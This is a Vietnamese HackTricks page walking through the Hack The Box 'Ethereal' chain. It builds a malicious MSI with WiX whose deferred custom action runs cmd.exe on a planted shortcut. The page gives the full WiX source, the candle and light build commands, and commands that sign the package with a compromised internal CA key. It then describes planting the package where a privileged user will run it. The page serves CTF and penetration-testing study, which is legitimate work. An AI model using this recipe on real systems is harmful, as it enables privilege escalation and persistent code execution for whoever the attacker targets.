# Tạo MSI với Custom-Action bằng WiX

{{#include ../../banners/hacktricks-training.md}}

Chuỗi khai thác Hack The Box mang tính lịch sử này đã dùng WiX Toolset v3 để tạo một MSI chạy tệp `.lnk` đã được cài sẵn. **MSI không tự động có đặc quyền cao**: quá trình thực thi diễn ra trong ngữ cảnh được xác định bởi chính sách Windows Installer, các thuộc tính custom-action và người cài đặt nó. Trong tình huống được trích dẫn, attacker cũng đã đánh cắp một CA đáng tin cậy để ký, rồi đặt MSI đã ký vào thư mục được một người dùng khác theo dõi.<sup>[[1]](#references)[[3]](#references)</sup>

Để hiểu toàn diện các ví dụ sử dụng MSI của WiX, bạn nên tham khảo [trang này](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Tại đây, bạn có thể tìm thấy nhiều ví dụ minh họa cách sử dụng MSI của WiX.<sup>[[2]](#references)</sup>

MSI chạy `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. XML WiX v3 gốc được giữ nguyên bên dưới:<sup>[[1]](#references)</sup>

```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```

`InstallerVersion` khai báo phiên bản Windows Installer tối thiểu và `Compressed="yes"` đánh dấu package là đã nén. `Stage1` là deferred nhưng có `Impersonate="yes"`, nên nó chạy với token được impersonate của người dùng đang cài đặt; sự thay đổi quyền trong tình huống này đến từ người dùng có đặc quyền mở MSI sau đó, chứ thuộc tính đó không tự cấp quyền SYSTEM.<sup>[[3]](#references)</sup>

Biên dịch mã nguồn thành đối tượng WiX bằng `candle.exe`:<sup>[[1]](#references)</sup>

```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```

Liên kết đối tượng đó vào một MSI bằng `light.exe`:<sup>[[1]](#references)</sup>

```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```

### Bước ký được sử dụng trong chuỗi khai thác ban đầu

Quy trình mục tiêu chấp nhận các gói được ký bởi một CA nội bộ đã bị xâm phạm. Bài viết hướng dẫn tạo chứng chỉ ký từ `MyCA.cer`/`MyCA.pvk` đã khôi phục, tạo PFX và ký MSI:<sup>[[1]](#references)</sup>

```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
  -ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
  -sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```

Kẻ tấn công sau đó đặt package đã ký vào `D:\DEV\MSIs` và chờ workflow/người dùng có đặc quyền thực thi nó. Hãy giữ nguyên điều kiện tiên quyết này khi áp dụng kỹ thuật: nếu không có đường dẫn cài đặt nâng quyền, policy không an toàn như `AlwaysInstallElevated` hoặc nạn nhân có đặc quyền, package này chỉ thực thi với quyền của người dùng hiện tại.

## References

- [1] [Hack The Box - Ethereal: Tạo MSI độc hại và chiếm quyền root - Blog của 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Giới thiệu nhanh: Tạo trình cài đặt MSI bằng WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Custom action thực thi trì hoãn (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
